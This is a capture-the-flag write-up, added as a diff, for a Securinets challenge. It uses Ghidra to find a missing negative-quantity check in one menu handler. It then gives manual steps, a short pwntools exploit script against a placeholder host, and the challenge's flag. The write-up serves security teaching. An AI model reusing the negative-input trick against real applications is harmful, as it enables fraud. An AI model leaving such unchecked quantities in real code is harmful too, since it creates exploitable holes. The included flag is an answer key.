@@ -1,0 +1,126 @@
+Author : Omar bel haj youssef
+category : medium 
+points:350
+
+1) Observing the program
+
+When connecting/running, you see a menu:
+
+    (0) Workshop Absence
+    (1) Test Absence
+    (2) Member Insult
+    (3) Redeem Portal Access Key (cost 1000)
+    (4) Revoke a Confession
+    (5) Exit
+
+You start with 100 points, but the key requires 1000, so normal play won’t reach it.
+2) Reverse engineering (Ghidra)
+
+Search for the string:
+
+text
+
+"How many do you want to confess?"
+
+Ghidra shows three similar confession handlers:
+
+    FUN_0040162a (item 0)
+    FUN_004016ce (item 1)
+    FUN_00401772 (item 2)
+
+Compare them:
+Safe handlers (0 and 1)
+
+Both include a negative check:
+
+C code :
+
+if (iVar1 < 0) {
+  puts("Invalid amount!");
+}
+
+So negative quantities are rejected there.
+Vulnerable handler (Member Insult)
+
+FUN_00401772 does not check iVar1 < 0. It only checks if quantity is larger than stock:
+
+C code :
+
+if (DAT_00404150 < iVar1) puts("Not enough available!");
+
+So if you enter a negative number, e.g. -10:
+
+    stock < -10 is false → passes
+    it reaches the “affordability” check and then applies the transaction
+
+This function also calls:
+
+C code : 
+
+FUN_004015a0(2, DAT_0040414c, iVar1);
+
+The 2 matches menu option (2) Member Insult
+
+3) Why negative increases points
+
+The apply/update logic effectively behaves like:
+
+C code :
+
+points = points - (rate * quantity);
+
+If quantity is negative:
+
+C code :
+
+points = points - (rate * -10)
+points = points + (rate * 10)
+
+So you gain points.
+
+4) Exploitation steps
+
+    Choose (2) Member Insult
+    Enter a negative quantity (example: -50)
+    Repeat until points ≥ 1000
+    Choose (3) Redeem Portal Access Key
+    The program prints the flag (remote reads it from flag.txt)
+
+Example manual interaction:
+
+text
+
+Choose an option: 2
+How many do you want to confess? -50
+Confession recorded!
+
+... repeat until >= 1000 ...
+
+Choose an option: 3
+# flag prints
+
+5) Quick pwntools exploit :
+
+
+from pwn import *
+
+r = remote("<HOST>", 1337)
+
+def confess_member_insult(qty):
+    r.recvuntil(b"Choose an option:")
+    r.sendline(b"2")
+    r.recvuntil(b"confess?")
+    r.sendline(str(qty).encode())
+
+# farm points
+for _ in range(5):
+    confess_member_insult(-50)
+
+# redeem key
+r.recvuntil(b"Choose an option:")
+r.sendline(b"3")
+
+print(r.recvall(timeout=2).decode(errors="ignore"))
+
+falg : Securinets_fst{c4de_pr0mo_securiNets_1687}
+
